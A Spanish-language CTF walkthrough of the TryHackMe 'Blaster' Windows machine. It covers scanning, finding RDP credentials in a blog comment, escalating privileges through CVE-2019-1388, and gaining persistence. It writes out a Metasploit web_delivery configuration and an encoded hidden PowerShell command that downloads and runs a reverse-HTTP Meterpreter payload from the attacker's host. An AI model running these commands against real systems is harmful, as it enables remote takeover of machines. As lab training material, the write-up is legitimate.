# Writeup Blaster - TryHackMe

| **Información** | **Detalle** |
| :--- | :--- |
| **IP** | `10.112.160.22` |
| **Plataforma** | TryHackMe |
| **Sistema Operativo** | Windows |
| **Dificultad** | Fácil |

---

## Tabla de Contenidos

1. [Reconocimiento](#reconocimiento)
2. [Enumeración Web y Acceso Inicial](#enumeración-web-y-acceso-inicial)
3. [Escalada de Privilegios (Bypass UAC)](#escalada-de-privilegios-bypass-uac)
4. [Persistencia y Metasploit](#persistencia-y-metasploit)
5. [Flags](#flags)

---

## Reconocimiento

Empezaremos nuestra aventura de piratear nuestra máquina con un escaneo de puertos sigiloso con Nmap para no llamar demasiado la atención, ya que sería lo adecuado en una auditoría real.

```bash
sudo nmap -sS -sC -v -Pn 10.128.133.107 -oN scan_blaster.txt

```

### Resultados del Escaneo

```bash
80/tcp   open  http
|_http-title: IIS Windows Server
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
3389/tcp open  ms-wbt-server
| rdp-ntlm-info: 
|   Target_Name: RETROWEB
|   NetBIOS_Domain_Name: RETROWEB
|   NetBIOS_Computer_Name: RETROWEB
|   DNS_Domain_Name: RetroWeb
|   DNS_Computer_Name: RetroWeb
|   Product_Version: 10.0.14393
|_  System_Time: 2026-03-14T21:41:14+00:00
| ssl-cert: Subject: commonName=RetroWeb
| Issuer: commonName=RetroWeb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-03-13T21:40:27
| Not valid after:  2026-09-12T21:40:27
| MD5:   9c1c:e8d6:7e87:5706:6142:02b4:fe1a:cc0e
|_SHA-1: e2f3:a452:67ce:6bba:1b39:d733:85d0:6c75:2cb3:5640
|_ssl-date: 2026-03-14T21:41:14+00:00; 0s from scanner time.

NSE: Script Post-scanning.
Initiating NSE at 22:41
Completed NSE at 22:41, 0.00s elapsed
Initiating NSE at 22:41
Completed NSE at 22:41, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 11.00 seconds
           Raw packets sent: 2002 (88.088KB) | Rcvd: 6 (264B)


```

> Podemos ver que tenemos dos bonitos puertos abiertos, el 80 (HTTP) y el 3389 (RDP). No es precisamente la configuración más discreta del mundo, pero nos viene de lujo para seguir avanzando.

---

## Enumeración Web y Acceso Inicial

Accederemos a nuestro servidor accediendo con la IP que nos proporcionaron, y se puede ver perfectamente. Al ver nada interesante en la página principal por defecto de IIS, utilizaremos un fuzzer de directorios como Gobuster para descubrir rutas ocultas.

![viendo la página principal de IIS](/imgBlaster/image.png)




```bash
gobuster dir -u http://10.128.133.107/ -w /usr/share/dirb/wordlists/big.txt 
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.128.133.107/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
retro                (Status: 301) [Size: 151] [--> http://10.128.133.107/retro/]

```
Podemos ver que hay una zona oculta dentro del servidor llamada "retro" y al acceder a ella nos topamos con un blog dedicado a los videojuegos, con una especial atención a la película Ready Player One.

![viendo el blog retro](/imgBlaster/image2.png)

Simplemente entrando a la página web, podemos ver que el blog es de un tal "Wade", y que en el mismo blog de Ready Player One deja su contraseña en un comentario para entrar por RDP (wade:parzival). Un detalle de seguridad... mejorable.

![viendo el comentario del blog](/imgBlaster/image3.png)


Con las credenciales que hemos encontrado, vamos a entrar a su equipo con su usuario y contraseña usando Remmina.

![Acceso RDP con Remmina](/imgBlaster/image4.png)

*Acceso inicial a la máquina a través de escritorio remoto.*

---

## Escalada de Privilegios
Ahora que tenemos acceso como usuario dentro del PC, me llama bastante la atención un archivo llamado ```hhupd.exe``` en el escritorio. A lo mejor ese archivo puede ser el pistoletazo de salida para obtener privilegios de administrador. Al buscar el ejecutable por Internet, me sale un CVE, concretamente el 2019-1388.

![buscando el ejecutable por Internet](/imgBlaster/image5.png)

Al investigar un poco más sobre la vulnerabilidad, me topé con una página demostrando como se puede abusar del ejecutable entrando en una página desde el propio ejecutable, intentar guardarlo y entrar al CMD desde ahí para obtener privilegios de administrador.

Para replicarlo, se va al navegador > Save As y se pone esta ruta ``C:\windows\system32\*.*``` usando como formato .html para que muestre todos los archivos de System32 para localizar el ejecutable y poder explotar la vulnerabilidad.

![explotando la vulnerabilidad](/imgBlaster/image6.png)

## Persistencia y Metasploit

Bien, ahora que ya tenemos acceso al CMD como SYSTEM/Administrador, vamos a aprovechar la situación para ganar una sesión de Meterpreter, que es bastante más cómoda para trabajar que el CMD de toda la vida.

Para ello, desde nuestra Kali usamos el módulo `web_delivery` de Metasploit, que básicamente nos genera un comando de PowerShell que tenemos que ejecutar en la víctima:

```bash
msfconsole
use exploit/multi/script/web_delivery
show targets              # Elegimos el target 2 (PSH - PowerShell)
set target 2
set payload windows/meterpreter/reverse_http
set LHOST 192.168.168.157
set LPORT 4444
run -j

```

![Configuración de web_delivery en Metasploit](/imgBlaster/image7.png)
*Configuración del módulo web_delivery.*

Al ejecutarlo en segundo plano (`run -j`), Metasploit nos escupe un comando de PowerShell bastante largo. Simplemente lo copiamos y lo pegamos en el CMD de la máquina Windows (el que abrimos con privilegios de SYSTEM):

```powershell
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJAB6AE8AdgBlAHgAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAegBPAHYAZQB4AC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAegBPAHYAZQB4AC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEANgA4AC4AMQA1ADcAOgA4ADAAOAAwAC8AMAB1AHEAUQBFAFQAcgAyAFYALwBiAEcAQwB1ADQAZwBKADIAbQAnACkAKQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEANgA4AC4AMQA1ADcAOgA4ADAAOAAwAC8AMAB1AHEAUQBFAFQAcgAyAFYAJwApACkAOwA=

```

En cuanto le damos al Enter en la máquina Windows, ya tenemos sesión de Meterpreter en la Kali. Bingo.

```bash
# Ya en la terminal de meterpreter de la sesión ganada
sessions -i 1
meterpreter > sysinfo
meterpreter > getuid

```

![Sesión Meterpreter obtenida](/imgBlaster/image7.png)
*Sesión de Meterpreter obtenida y confirmación de privilegios con `sysinfo` y `getuid`.*